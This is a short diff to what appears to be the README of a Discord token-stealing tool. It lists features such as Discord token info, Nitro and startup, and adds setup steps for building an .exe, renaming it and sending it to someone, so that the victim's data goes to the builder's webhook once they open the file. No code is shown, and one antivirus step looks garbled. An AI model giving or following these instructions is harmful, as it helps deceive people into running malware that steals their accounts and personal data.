@@ -1,3 +1,5 @@
+Setup under features 
+
 * Features 
 * Discord token info
 * Nitro
@@ -28,3 +30,17 @@
 * installation
 * Startup
 * And more!!
+
+Setup
+
+Download the zip
+Extract it
+turn on antivirus it might delete important files
+open the .exe file
+then open installpy file
+then open the build.bat file
+follow the instructions
+open the dist folder
+rename your file in the dist folder
+send it to somebody 
+once they download and open your file their stuff will be sent to your webhook.
